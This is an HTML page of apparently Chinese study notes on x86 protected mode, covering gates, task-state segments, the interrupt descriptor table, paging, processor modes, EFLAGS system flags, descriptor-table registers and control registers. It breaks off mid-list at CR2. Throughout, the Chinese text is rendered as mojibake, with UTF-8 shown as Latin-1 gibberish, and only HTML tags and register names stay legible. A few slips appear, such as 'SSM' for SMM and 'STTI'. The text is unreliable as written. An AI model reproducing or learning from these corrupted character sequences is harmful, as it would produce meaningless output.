<p>æ“ä½œç³»ç»Ÿå®šä¹‰äº†ä¸€å¥—åä¸ºé—¨çš„æè¿°ç¬¦â€”è°ƒç”¨é—¨ã€ä¸­æ–­é—¨ã€é™·é˜±é—¨å’Œä»»åŠ¡é—¨ï¼Œé—¨è¿™ç§æè¿°ç¬¦æä¾›äº†ä¸€ç§è®¿é—®è¿è¡Œåœ¨ä¸åŒäºåº”ç”¨ç¨‹åºç‰¹æƒçº§çš„ç³»ç»Ÿè¿‡ç¨‹å’Œå¤„ç†ç¨‹åºçš„æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯ç¨‹åº/è¿›ç¨‹/å†…æ ¸ä¹‹é—´çš„äº¤äº’ã€‚</p>
<p>å½“è®¿é—®å’Œå½“å‰ä»£ç æ®µç‰¹æƒç›¸åŒæˆ–ç‰¹æƒæ›´é«˜çš„ä»£ç æ®µçš„æ—¶å€™ï¼Œé€šè¿‡è°ƒç”¨é—¨è®¿é—®ï¼Œç”±è°ƒç”¨ç¨‹åºæ¥æä¾›è°ƒç”¨é—¨çš„é€‰æ‹©ç¬¦ã€‚</p>
<h3 id="ä»»åŠ¡çŠ¶æ€æ®µå’Œä»»åŠ¡é—¨">ä»»åŠ¡çŠ¶æ€æ®µå’Œä»»åŠ¡é—¨</h3>
<p>TSS(å¦‚å›¾ 1)å®šä¹‰äº†ä»»åŠ¡æ‰§è¡Œç¯å¢ƒçš„çŠ¶æ€ã€‚è¿™äº›çŠ¶æ€åŒ…æ‹¬é€šç”¨å¯„å­˜å™¨ã€æ®µå¯„å­˜å™¨ã€EFLAGSå¯„å­˜å™¨ã€EIP å¯„å­˜å™¨å’Œæ®µé€‰æ‹©ç¬¦ä»¥åŠä¸‰ä¸ªå † æ ˆæ®µ(ç‰¹æƒ 0ã€1ã€2 å„ä¸€ä¸ªå †æ ˆ)çš„æŒ‡é’ˆçš„çŠ¶æ€ã€‚å®ƒä¹ŸåŒ…æ‹¬äº†ä¸ä»»åŠ¡ç›¸åº”çš„ LDT çš„é€‰æ‹©ç¬¦å’Œé¡µè¡¨çš„åŸºåœ°å€ã€‚æ‰€æœ‰è¿è¡Œåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ç¨‹åºï¼Œéƒ½æ˜¯ä¸€ä¸ªç§°ä½œå½“å‰ä»»åŠ¡çš„ä¸Šä¸‹æ–‡ä¸­è¿›è¡Œçš„ã€‚å½“å‰ä»»åŠ¡çš„ TSSçš„æ®µé€‰æ‹©ç¬¦ä¿å­˜åœ¨ä»»åŠ¡å¯„å­˜å™¨ä¸­ã€‚åˆ‡æ¢åˆ°ä¸€ä¸ªä»»åŠ¡çš„æœ€ç®€å•çš„æ–¹æ³•æ˜¯è¿›è¡Œ CALL æˆ– JMP åˆ°é‚£ä¸ªä»»åŠ¡ä¸­ã€‚æ–°ä»»åŠ¡çš„ TSS çš„æ®µé€‰æ‹©ç¬¦æ˜¯é€šè¿‡ CALL æˆ– JMP æŒ‡ä»¤ç»™å‡ºã€‚åœ¨è¿›è¡Œä»»åŠ¡åˆ‡æ¢ æ—¶ï¼Œå¤„ç†å™¨æŒ‰ç…§ä¸‹é¢çš„æ¬¡åºè¿›è¡Œ:</p>
<ol>
<li class="lvl-3">
<p>ä¿å­˜å½“å‰ TSS ä¸­å½“å‰ä»»åŠ¡çš„çŠ¶æ€ã€‚</p>
</li>
<li class="lvl-3">
<p>è£…è½½æ–°ä»»åŠ¡æ®µé€‰æ‹©ç¬¦çš„ä»»åŠ¡å¯„å­˜å™¨ã€‚</p>
</li>
<li class="lvl-3">
<p>é€šè¿‡ GDT ä¸­æ®µé€‰æ‹©ç¬¦è®¿é—®æ–°çš„ TSSã€‚</p>
</li>
<li class="lvl-3">
<p>å°†æ–° TSS ä¸­æ–°ä»»åŠ¡çš„çŠ¶æ€è£…è½½åˆ°é€šç”¨å¯„å­˜å™¨ã€æ®µå¯„å­˜å™¨ã€LDTRã€æ§åˆ¶å¯„å­˜å™¨ CR3(é¡µè¡¨åŸºåœ°å€)ã€EFLAGS å¯„å­˜å™¨å’Œ EIP å¯„å­˜å™¨ã€‚</p>
</li>
<li class="lvl-3">
<p>å¼€å§‹æ‰§è¡Œæ–°ä»»åŠ¡ã€‚</p>
</li>
</ol>
<p>ä»»åŠ¡ä¹Ÿå¯ä»¥é€šè¿‡ä»»åŠ¡é—¨è®¿ï¼Œä»»åŠ¡é—¨ä¸è°ƒç”¨é—¨å¾ˆç›¸ä¼¼ï¼Œé™¤äº†å®ƒæ˜¯æä¾›(é€šè¿‡é€‰æ‹©ç¬¦)å¯¹ TSS è€Œä¸æ˜¯å¯¹ä»£ç æ®µçš„è®¿é—®ã€‚</p>
<h3 id="ä¸­æ–­ä¸å¼‚å¸¸å¤„ç†">ä¸­æ–­ä¸å¼‚å¸¸å¤„ç†</h3>
<p>å¤–éƒ¨ä¸­æ–­ã€è½¯ä»¶ä¸­æ–­å’Œå¼‚å¸¸æ˜¯é€šè¿‡ä¸­æ–­æè¿°ç¬¦è¡¨(IDT)å¤„ç†çš„ï¼Œ</p>
<p>å’ŒGDTè¡¨ç±»ä¼¼ï¼Œåœ¨è¿è¡Œä¸­æ–­æˆ–å¼‚å¸¸å¤„ç†ç¨‹åºçš„æ—¶å€™ï¼Œå¤„ç†å™¨éœ€è¦å…ˆä»å†…éƒ¨ç¡¬ä»¶ã€å¤–éƒ¨ä¸­æ–­æ§åˆ¶å™¨ã€æˆ–é€šè¿‡æ‰§è¡ŒINTã€INTOã€INT 3æˆ–BOUNDæŒ‡ä»¤çš„è½¯ä»¶ä¸­æ–­ä¸­æ¥æ”¶åˆ°ä¸€ä¸ªä¸­æ–­å‘é‡ã€‚</p>
<p>ä¸­æ–­å‘é‡å†…æœ‰IDTä¸­çš„é—¨æè¿°ç¬¦çš„ç´¢å¼•ã€‚</p>
<p>é€šè¿‡IDTè¡¨ï¼Œç¨‹åºå¯ä»¥æ‰§è¡Œå®Œä¸­æ–­/å¼‚å¸¸ä¹‹åæ­£å¸¸è¿”å›ï¼Œåˆ‡æ¢ä»»åŠ¡æ‰§è¡Œã€‚</p>
<h3 id="å†…å­˜ç®¡ç†">å†…å­˜ç®¡ç†</h3>
<p>ä¸»è¦æœ‰ä¸¤ç§å½¢å¼</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç›´æ¥ç‰©ç†åœ°å€</p>
</li>
<li class="lvl-2">
<p>è™šæ‹Ÿå†…å­˜(é€šè¿‡åˆ†é¡µ)</p>
</li>
</ul>
<p>ä½¿ç”¨åˆ†é¡µçš„æ–¹å¼çš„æ—¶å€™ï¼Œæ‰€æœ‰çš„ä»£ç ã€å †æ ˆã€ç³»ç»Ÿæ®µç­‰æ®µéƒ½å¯ä»¥å°†æœ€è¿‘è®¿é—®è¿‡é¡µé©»ç•™åœ¨å†…å­˜ä¸­è€Œè¿›è¡Œåˆ†é¡µã€‚</p>
<p>é¡µçš„ç›¸å…³ä¿¡æ¯ä¿å­˜åœ¨ä¸¤ä¸ªç±»å‹çš„ç³»ç»Ÿæ•°æ®ç»“æ„ä¸­ï¼šé¡µç›®å½•å’Œé¡µè¡¨</p>
<p>çº¿æ€§åœ°å€åˆ™ä¼šè¢«åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼šé¡µç›®å½•ã€é¡µè¡¨ã€é¡µæ¡†ä¸­çš„åç§»é‡ã€‚</p>
<p>ä¸€ä¸ªç³»ç»Ÿå¯ä»¥æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªé¡µç›®å½•ã€‚</p>
<h3 id="ç³»ç»Ÿå¯„å­˜å™¨">ç³»ç»Ÿå¯„å­˜å™¨</h3>
<p>ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ç§</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>EFLAGESå¯„å­˜å™¨</p>
</li>
<li class="lvl-2">
<p>æ§åˆ¶å¯„å­˜å™¨</p>
</li>
<li class="lvl-2">
<p>è°ƒè¯•å¯„å­˜å™¨</p>
</li>
<li class="lvl-2">
<p>GDTRã€LDTRå’ŒLDTRå¯„å­˜å™¨</p>
</li>
<li class="lvl-2">
<p>ä»»åŠ¡å¯„å­˜å™¨</p>
</li>
<li class="lvl-2">
<p>æ¨¡å¼ç›¸å…³çš„å¯„å­˜å™¨</p>
</li>
</ul>
<h2 id="è¿è¡Œæ¨¡å¼">è¿è¡Œæ¨¡å¼</h2>
<p>ä¸»è¦æœ‰å››ç§</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>ä¿æŠ¤æ¨¡å¼</strong>â€”ä¿æŠ¤æ¨¡å¼æ˜¯å¤„ç†å™¨çš„åŸç”Ÿæ¨¡å¼ï¼Œåœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œæ‹¥æœ‰å¤„ç†å™¨çš„æ‰€æœ‰ç‰¹ç‚¹å’ŒæŒ‡ä»¤ï¼Œå…·æœ‰æœ€å¥½çš„æ€§èƒ½ã€‚å¯¹æ‰€æœ‰æ–°åº”ç”¨ç¨‹åºå’Œæ“ä½œç³»ç»Ÿæ¨èä½¿ç”¨è¯¥æ¨¡å¼</p>
</li>
<li class="lvl-2">
<p><strong>å®æ¨¡å¼</strong>â€”è¿™ä¸ªæ¨¡å¼æä¾›äº†intel8086çš„å˜æˆæ¨¡å¼å’Œä¸€äº›æ‰©å±•â†’æ¯”å¦‚åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼æˆ–ç³»ç»Ÿç®¡ç†æ¨¡å¼</p>
</li>
<li class="lvl-2">
<p><strong>ç³»ç»Ÿç®¡ç†æ¨¡å¼(SSM)</strong>â€”è¿™ç§æ¨¡å¼ä¸ºæ“ä½œç³»ç»Ÿå®ç°ç”µæºå’ŒOEMä¸“æœ‰ç‰¹å¾æä¾›äº†ä¸€ç§é€æ˜çš„æœºåˆ¶ã€‚SSMæ¨¡å¼æ˜¯é€šè¿‡æ¿€æ´»å¤–éƒ¨ç³»ç»Ÿä¸­æ–­é’ˆ(SMI#)è€Œè¿›å…¥çš„ï¼Œæ¿€æ´»äº§ç”Ÿäº†ä¸€ä¸ªç³»ç»Ÿä¸­æ–­(SMI)ã€‚åœ¨SMMä¸­å¤„ç†å™¨å…ˆä¿å­˜å¥½å½“å‰è¿è¡Œçš„ç¨‹åºå’Œä»»åŠ¡ä¸Šä¸‹æ–‡ï¼Œç„¶ååˆ‡æ¢åˆ°ä¸€ä¸ªå•ç‹¬çš„åœ°å€ç©ºé—´ï¼Œä»SMMè¿”å›åå¤„ç†å™¨å†è¿”å›SMIä¹‹å‰çš„çŠ¶æ€ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>è™šæ‹Ÿ8086æ¨¡å¼</strong>â€”åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œå¤„ç†å™¨æä¾›äº†ä¸€ç§å‡†æ¨¡å¼å«ä½œè™šæ‹Ÿ8086æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼å…è®¸åœ¨å¤šä»»åŠ¡çš„ä¿æŠ¤æ¨¡å¼ä¸‹å¤„ç†æ‰§è¡Œ8086ç¨‹åºã€‚</p>
</li>
</ul>
<p>ä¸‹å›¾ä¸ºå¤„ç†å™¨è¿è¡Œæ¨¡å¼ä¹‹é—´çš„è½¬æ¢</p>
<p><img src="./images/os%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B01%203ca99f0311ef4b6fa13a100e6296dfe4/Untitled%204.png" alt="Untitled"></p>
<h2 id="EFLAGESå¯„å­˜å™¨ä¸­çš„ç³»ç»Ÿæ ‡å¿—å’ŒåŸŸ">EFLAGESå¯„å­˜å™¨ä¸­çš„ç³»ç»Ÿæ ‡å¿—å’ŒåŸŸ</h2>
<p><img src="./images/os%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B01%203ca99f0311ef4b6fa13a100e6296dfe4/Untitled%205.png" alt="Untitled"></p>
<p>EFLAGESä¸­çš„ç³»ç»Ÿæ ‡å¿—å’ŒIOPLåŸŸç”¨äºæ§åˆ¶I/Oã€å¯å±è”½ç¡¬ä»¶ä¸­æ–­ã€è°ƒè¯•ã€ä»»åŠ¡åˆ‡æ¢å’Œè™šæ‹Ÿ8086æ¨¡å¼ã€‚åªæœ‰ç‰¹æƒä»£ç ï¼ˆé€šå¸¸æ˜¯æ“ä½œç³»ç»Ÿä»£ç ï¼‰å¯ä»¥ä¿®æ”¹è¿™äº›ä½ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>TF</strong>: <strong>é™·é˜±</strong>ï¼ˆç¬¬8ä½ï¼‰ç½®1æ˜¯è°ƒè¯•çŠ¶æ€ä¸‹çš„å•æ­¥æ‰§è¡Œï¼Œç½®0æ˜¯ç¦ç”¨å•æ­¥æ‰§è¡Œã€‚åœ¨å•æ­¥æ‰§è¡Œæ¨¡å¼ä¸‹å¤„ç†å™¨åœ¨æ¯æ¡æŒ‡ä»¤åäº§ç”Ÿä¸€ä¸ªè°ƒè¯•å¼‚å¸¸ï¼Œè¿™æ ·åœ¨æ¯æ¡æŒ‡ä»¤æ‰§è¡Œåéƒ½å¯ä»¥æŸ¥çœ‹æ‰§è¡Œç¨‹åºçš„çŠ¶æ€ã€‚å¦‚æœç¨‹åºç”¨POPFã€POPFDæˆ–è€…IRETæŒ‡ä»¤ä¿®æ”¹TFæ ‡å¿—ï¼Œé‚£ä¹ˆè°ƒè¯•å¼‚å¸¸å°±åœ¨æ‰§è¡ŒPOPFã€POPFDæˆ–è€…IRETæŒ‡ä»¤åäº§ç”Ÿã€‚</p>
</li>
<li class="lvl-2">
<p><strong>IF</strong>: <strong>ä¸­æ–­å…è®¸</strong>ï¼ˆä½9ï¼‰æ§åˆ¶ç€å¤„ç†å™¨å¯¹å¯å±è”½ç¡¬ä»¶ä¸­æ–­è¯·æ±‚çš„å“åº”ã€‚ç½®1æ˜¯å“åº”å¯å±è”½ç¡¬ä»¶ä¸­æ–­ï¼Œç½®0ä¸ºç¦æ­¢å“åº”å¯å±è”½ç¡¬ä»¶ä¸­æ–­ï¼ŒIFæ ‡å¿—å¹¶ä¸å½±å“å¼‚å¸¸å’Œä¸å¯å±è”½ä¸­æ–­ï¼ˆNMIï¼‰çš„äº§ç”Ÿã€‚æ§åˆ¶å¯„å­˜å™¨CR4ä¸­çš„CPLã€IOPLå’ŒVMEæ ‡å¿—å†³å®šç€IFæ ‡å¿—æ˜¯å¯å¦å¯ä»¥ç”±æŒ‡ä»¤CLIã€STTIã€POPFã€POPFDå’ŒIRETä¿®æ”¹ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>IOPL</strong>: <strong>I/Oç‰¹æƒåŸŸ</strong>ï¼ˆä½12å’Œä½13ï¼‰æŒ‡å‡ºå½“å‰ç¨‹åºæˆ–ä»»åŠ¡çš„I/Oç‰¹æƒçº§åˆ«ã€‚å½“å‰ç¨‹åºæˆ–ä»»åŠ¡çš„CPLå¿…é¡»å°äºæˆ–ç­‰äºIOPLæ‰å¯ä»¥è®¿é—®I/Oåœ°å€ç©ºé—´ã€‚å½“è¿è¡Œåœ¨0çº§ç‰¹æƒæ—¶ï¼Œè¯¥åŸŸåªèƒ½ç”±çš„POPFå’ŒIRETæŒ‡ä»¤ä¿®æ”¹ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>NT</strong>: <strong>åµŒå¥—ä»»åŠ¡</strong>ï¼ˆä½14ï¼‰æ§åˆ¶è¢«ä¸­æ–­å’Œè¢«è°ƒç”¨çš„ä»»åŠ¡çš„é“¾æ¥ã€‚å¤„ç†å™¨åœ¨è°ƒç”¨ä¸€ä¸ªç”±CALLæŒ‡ä»¤ã€ä¸­æ–­æˆ–è€…å¼‚å¸¸è§¦å‘çš„ä»»åŠ¡æ—¶è®¾ç½®è¯¥ä½ã€‚å½“ä»»åŠ¡å› è°ƒç”¨IRETæŒ‡ä»¤è€Œè¿”å›æ—¶ï¼Œå¤„ç†å™¨æ£€æµ‹å¹¶ä¿®æ”¹è¯¥ä½ã€‚è¯¥æ ‡å¿—å¯ä»¥ç”±POPF/POPFDæŒ‡ä»¤ç›´æ¥ç½®ä½æˆ–æ¸…é›¶ï¼Œç„¶è€Œåœ¨åº”ç”¨ç¨‹åºä¸­ä¿®æ”¹è¯¥æ ‡å¿—çš„çŠ¶æ€ä¼šäº§ç”Ÿä¸å¯é¢„æ–™çš„å¼‚å¸¸ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>RF</strong>: <strong>æ¢å¤</strong>ï¼ˆä½16ï¼‰æ§åˆ¶ç€å¤„ç†å™¨å¯¹æ–­ç‚¹æŒ‡ä»¤æ¡ä»¶çš„å“åº”ã€‚å½“ç½®1æ—¶ï¼Œè¯¥æ ‡å¿—å¯ä»¥ä¸´æ—¶ç¦ç”¨ç”±äºæŒ‡ä»¤æ–­ç‚¹è€Œäº§ç”Ÿè°ƒè¯•å¼‚å¸¸ï¼ˆï¼ƒDEï¼‰ï¼Œä½†æ˜¯å…¶å®ƒçš„å¼‚å¸¸æ¡ä»¶ä»å¯ä»¥äº§ç”Ÿå¼‚å¸¸ã€‚ç½®0æ—¶æŒ‡ä»¤æ–­ç‚¹äº§ç”Ÿè°ƒè¯•å¼‚å¸¸ã€‚RFæ ‡å¿—çš„ä¸»è¦åŠŸèƒ½æ˜¯é‡æ–°æ‰§è¡Œç”±æŒ‡ä»¤æ–­ç‚¹è€Œå¼•å‘çš„è°ƒè¯•å¼‚å¸¸åé¢çš„æŒ‡ä»¤ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>VM</strong>: <strong>è™šæ‹Ÿ8086æ¨¡å¼</strong>ï¼ˆä½17ï¼‰ç½®1è¿›å…¥è™šæ‹Ÿ8086æ¨¡å¼ï¼Œç½®0è¿”å›ä¿æŠ¤æ¨¡å¼ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>AC</strong>: <strong>å¯¹é½æ£€æŸ¥</strong>å°†è¯¥ä½ç½®1çš„åŒæ—¶ï¼Œå°†æ§åˆ¶å¯„å­˜å™¨ä¸­CR0ä¸­çš„AMæ ‡å¿—ç½®1å°±å¯ç”¨äº†å¯¹å†…å­˜å¼•ç”¨çš„å¯¹é½æ£€æŸ¥ã€‚å°†ACæ ‡å¿—å’Œ/æˆ–AMæ ‡å¿—æ¸…é›¶å°±ç¦ç”¨äº†å¯¹é½æ£€æŸ¥ã€‚å¯¹é½æ£€æŸ¥å¼‚å¸¸åªåœ¨ç”¨æˆ·æ¨¡å¼ï¼ˆ3çº§ç‰¹æƒï¼‰ä¸‹äº§ç”Ÿã€‚é»˜è®¤ç‰¹æƒä¸º0çš„å†…å­˜å¼•ç”¨ï¼Œæ¯”å¦‚æ®µæè¿°è¡¨çš„è£…è½½ï¼Œå¹¶ä¸äº§ç”Ÿè¿™ä¸ªå¼‚å¸¸ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>VIF</strong>: <strong>è™šæ‹Ÿä¸­æ–­</strong>ï¼ˆä½ 19ï¼‰åŒ…å«äº†ä¸€ä¸ª IF æ ‡å¿—çš„è™šæ‹Ÿæ˜ è±¡ã€‚è¿™ä¸ªæ ‡å¿—æ˜¯å’Œ VIP æ ‡å¿—ä¸€èµ·ä½¿ç”¨çš„ã€‚å½“æ§åˆ¶å¯„å­˜å™¨ CR4 ä¸­çš„ VME æˆ–è€… PVI æ ‡å¿—ç½®ä¸º 1 ä¸” IOPL å°äº 3 æ—¶ï¼Œå¤„ç†å™¨åªè¯†åˆ« VIF æ ‡å¿—ï¼ˆVME æ ‡å¿—ç”¨æ¥å¯ç”¨è™šæ‹Ÿ 8086 æ¨¡å¼æ‰©å±•ï¼ŒPVI æ ‡å¿—å¯ç”¨ä¿æŠ¤æ¨¡å¼ä¸‹çš„è™šæ‹Ÿä¸­æ–­ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>VIP</strong>: <strong>è™šæ‹Ÿä¸­æ–­ç­‰å¾…</strong>ï¼ˆä½20ï¼‰ç”±è½¯ä»¶ç½®1è¡¨æ˜æœ‰ä¸€ä¸ªä¸­æ–­æ˜¯æ­£åœ¨ç­‰å¾…è¢«å¤„ç†,ç½®0è¡¨æ˜æ²¡æœ‰ç­‰å¾…å¤„ç†çš„ä¸­æ–­,è¯¥æ ‡å¿—å’ŒVIFä¸€èµ·ä½¿ç”¨ã€‚å¤„ç†å™¨è¯»å–è¯¥æ ‡å¿—ä½†ä»æ¥ä¸ä¿®æ”¹å®ƒ,å½“VMEæ ‡å¿—æˆ–è€…æ§åˆ¶å¯„å­˜å™¨CR4ä¸­çš„PVIæ ‡å¿—ç½®1ä¸”IOPLå°äº3æ—¶ï¼Œå¤„ç†å™¨åªè¯†åˆ«VIPæ ‡å¿—ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>ID</strong>: <strong>è¯†åˆ«</strong>ï¼ˆä½21ï¼‰è½¯ä»¶ç½®1æˆ–0è¡¨æ˜æ˜¯å¦æ”¯æŒCPUIDæŒ‡ä»¤ã€‚</p>
</li>
</ul>
<h2 id="å†…å­˜ç®¡ç†å¯„å­˜å™¨">å†…å­˜ç®¡ç†å¯„å­˜å™¨</h2>
<p>å¤„ç†å™¨ä¸­ä¸å†…å­˜ç®¡ç†æœ‰å…³çš„å¯„å­˜å™¨å…±æœ‰å››ä¸ªâ€”GDTRã€LDTRã€IDTRå’ŒTR</p>
<p><img src="./images/os%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B01%203ca99f0311ef4b6fa13a100e6296dfe4/Untitled%206.png" alt="Untitled"></p>
<h3 id="å…¨å±€æè¿°ç¬¦è¡¨å¯„å­˜å™¨-GDTR">å…¨å±€æè¿°ç¬¦è¡¨å¯„å­˜å™¨(GDTR)</h3>
<p>GDTRå¯„å­˜å™¨ç”¨äºä¿å­˜GDTçš„32ä½åŸºåœ°å€å’Œ16ä½è¡¨ç•Œé™ã€‚åŸºåœ°å€æŒ‡çš„æ˜¯GDTçš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„çº¿æ€§åœ°å€ï¼Œè€Œè¡¨ç•Œé™è¡¨ç¤ºGDTä¸­çš„å­—èŠ‚æ•°ã€‚LGDTå’ŒSGDTæŒ‡ä»¤åˆ†åˆ«ç”¨äºåŠ è½½å’Œä¿å­˜GDTRå¯„å­˜å™¨çš„å€¼ã€‚åœ¨å¤„ç†å™¨ä¸Šç”µæˆ–å¤ä½æ—¶ï¼ŒåŸºåœ°å€é»˜è®¤ä¸º0ï¼Œè¡¨ç•Œé™é»˜è®¤ä¸ºFFFFHã€‚åœ¨è¿›è¡Œä¿æŠ¤æ¨¡å¼çš„æ“ä½œæ—¶ï¼Œä½œä¸ºå¤„ç†å™¨åˆå§‹åŒ–çš„ä¸€éƒ¨åˆ†ï¼Œéœ€è¦å°†æ–°çš„åŸºåœ°å€åŠ è½½åˆ°GDTRä¸­ã€‚</p>
<h3 id="å±€éƒ¨æè¿°ç¬¦è¡¨å¯„å­˜å™¨-LDTR">å±€éƒ¨æè¿°ç¬¦è¡¨å¯„å­˜å™¨(LDTR)</h3>
<p>LDTRå¯„å­˜å™¨å­˜å‚¨äº†16ä½çš„æ®µé€‰æ‹©ç¬¦ã€32ä½çš„åŸºåœ°å€ã€16ä½çš„æ®µç•Œé™ä»¥åŠLDTæè¿°ç¬¦çš„å±æ€§ã€‚åŸºåœ°å€æŒ‡çš„æ˜¯LDTæ®µä¸­ç¬¬ä¸€ä¸ªå­—èŠ‚çš„çº¿æ€§åœ°å€ï¼Œè€Œæ®µç•Œé™è¡¨ç¤ºæ®µä¸­çš„å­—èŠ‚ä¸ªæ•°ã€‚LLDTå’ŒSLDTæŒ‡ä»¤ä¸“ç”¨äºåŠ è½½å’Œä¿å­˜LDTRå¯„å­˜å™¨ä¸­çš„æ®µé€‰æ‹©ç¬¦éƒ¨åˆ†ã€‚ä»»ä½•åŒ…å«LDTçš„æ®µå¿…é¡»åœ¨GDTä¸­æœ‰ä¸€ä¸ªæ®µæè¿°ç¬¦ã€‚å½“æ‰§è¡ŒLLDTæŒ‡ä»¤æ¥åŠ è½½LDTRä¸­çš„æ®µé€‰æ‹©ç¬¦æ—¶ï¼ŒLDTæè¿°ç¬¦çš„åŸºåœ°å€ã€ç•Œé™å’Œå±æ€§å°†è‡ªåŠ¨åŠ è½½åˆ°LDTRä¸­ã€‚åœ¨è¿›è¡Œä»»åŠ¡åˆ‡æ¢æ—¶ï¼ŒLDTRä¼šè‡ªåŠ¨åŠ è½½æ–°ä»»åŠ¡çš„æ®µé€‰æ‹©ç¬¦å’Œæè¿°ç¬¦ã€‚åœ¨å°†æ–°çš„LDTä¿¡æ¯å†™å…¥å¯„å­˜å™¨ä¹‹å‰ï¼ŒLDTRçš„å†…å®¹ä¸ä¼šè‡ªåŠ¨ä¿å­˜ã€‚åœ¨å¤„ç†å™¨ä¸Šç”µæˆ–å¤ä½æ—¶ï¼Œæ®µé€‰æ‹©ç¬¦å’ŒåŸºåœ°å€éƒ½è¢«è®¾ä¸ºé»˜è®¤å€¼0ï¼Œæ®µç•Œé™è¢«è®¾ç½®ä¸ºFFFFHã€‚</p>
<h3 id="IDTRä¸­æ–­æè¿°ç¬¦è¡¨å¯„å­˜å™¨">IDTRä¸­æ–­æè¿°ç¬¦è¡¨å¯„å­˜å™¨</h3>
<p>IDTRå¯„å­˜å™¨ç”¨äºä¿å­˜IDTçš„32ä½åŸºåœ°å€å’Œ16ä½è¡¨ç•Œé™ã€‚åŸºåœ°å€æŒ‡çš„æ˜¯IDTä¸­ç¬¬ä¸€ä¸ªå­—èŠ‚çš„çº¿æ€§åœ°å€ï¼Œè€Œè¡¨ç•Œé™è¡¨ç¤ºIDTä¸­çš„å­—èŠ‚ä¸ªæ•°ã€‚LIDTå’ŒSIDTæŒ‡ä»¤ä¸“é—¨ç”¨äºåŠ è½½å’Œä¿å­˜IDTRå¯„å­˜å™¨çš„å€¼ã€‚åœ¨å¤„ç†å™¨ä¸Šç”µæˆ–å¤ä½æ—¶ï¼ŒåŸºåœ°å€é»˜è®¤ä¸º0ï¼Œè¡¨ç•Œé™é»˜è®¤ä¸ºFFFFHã€‚ä½œä¸ºå¤„ç†å™¨åˆå§‹åŒ–çš„ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥ä¿®æ”¹å¯„å­˜å™¨ä¸­çš„åŸºåœ°å€å’Œè¡¨ç•Œé™ã€‚</p>
<h3 id="ä»»åŠ¡å¯„å­˜å™¨-TR">ä»»åŠ¡å¯„å­˜å™¨(TR)</h3>
<p>ä»»åŠ¡å¯„å­˜å™¨ä¿å­˜ç€16ä½çš„æ®µé€‰æ‹©ç¬¦ã€32ä½çš„åŸºåœ°å€ã€16ä½çš„æ®µç•Œé™ä»¥åŠå½“å‰ä»»åŠ¡çš„TSSæè¿°ç¬¦å±æ€§ã€‚å®ƒå¼•ç”¨GDTä¸­çš„TSSæè¿°ç¬¦ã€‚åŸºåœ°å€æŒ‡ç¤ºTSSä¸­ç¬¬ä¸€ä¸ªå­—èŠ‚çš„çº¿æ€§åœ°å€ï¼Œæ®µç•Œé™æŒ‡ç¤ºTSSä¸­çš„å­—èŠ‚æ•°é‡ã€‚LTRå’ŒSTRæŒ‡ä»¤ä¸“é—¨ç”¨äºåŠ è½½å’Œä¿å­˜ä»»åŠ¡å¯„å­˜å™¨ä¸­çš„æ®µé€‰æ‹©ç¬¦éƒ¨åˆ†ã€‚å½“ä½¿ç”¨LTRæŒ‡ä»¤åŠ è½½ä»»åŠ¡å¯„å­˜å™¨ä¸­çš„æ®µé€‰æ‹©ç¬¦æ—¶ï¼ŒåŸºåœ°å€ã€ç•Œé™å’ŒTSSæè¿°ç¬¦ä¼šè‡ªåŠ¨åŠ è½½åˆ°ä»»åŠ¡å¯„å­˜å™¨ä¸­ã€‚å¤„ç†å™¨ä¸Šç”µæˆ–å¤ä½åï¼ŒåŸºåœ°å€è¢«è®¾ç½®ä¸ºé»˜è®¤å€¼0ï¼Œç•Œé™è¢«è®¾ç½®ä¸ºFFFFHã€‚åœ¨è¿›è¡Œä»»åŠ¡åˆ‡æ¢æ—¶ï¼Œä»»åŠ¡å¯„å­˜å™¨ä¼šè‡ªåŠ¨åŠ è½½æ–°ä»»åŠ¡çš„æ®µé€‰æ‹©ç¬¦å’ŒTSSæè¿°ç¬¦ã€‚åœ¨å‘ä»»åŠ¡å¯„å­˜å™¨å†™å…¥æ–°å†…å®¹ä¹‹å‰ï¼Œä»»åŠ¡å¯„å­˜å™¨çš„å†…å®¹ä¸ä¼šè‡ªåŠ¨ä¿å­˜ã€‚</p>
<h2 id="æ§åˆ¶å¯„å­˜å™¨">æ§åˆ¶å¯„å­˜å™¨</h2>
<p>æ§åˆ¶å¯„å­˜å™¨ä¸»è¦æœ‰äº”ä¸ª</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>CR0â€”åŒ…å«ç³»ç»Ÿæ§åˆ¶æ ‡å¿—ï¼Œè¿™äº›æ ‡å¿—æ§åˆ¶ç€å¤„ç†å™¨çš„è¿è¡Œæ¨¡å¼å’ŒçŠ¶æ€</p>
</li>
<li class="lvl-2">
<p>CR1â€”ä¿ç•™</p>
</li>
<li class="lvl-2">
<p>CR2â€”åŒ…å«ç¼ºé¡µçš„çº¿æ€§åœ°å€(å¼•èµ·ç¼ºé¡µçš„çº¿æ€§åœ°å€)</p>
</li>
<li class="lvl-2">
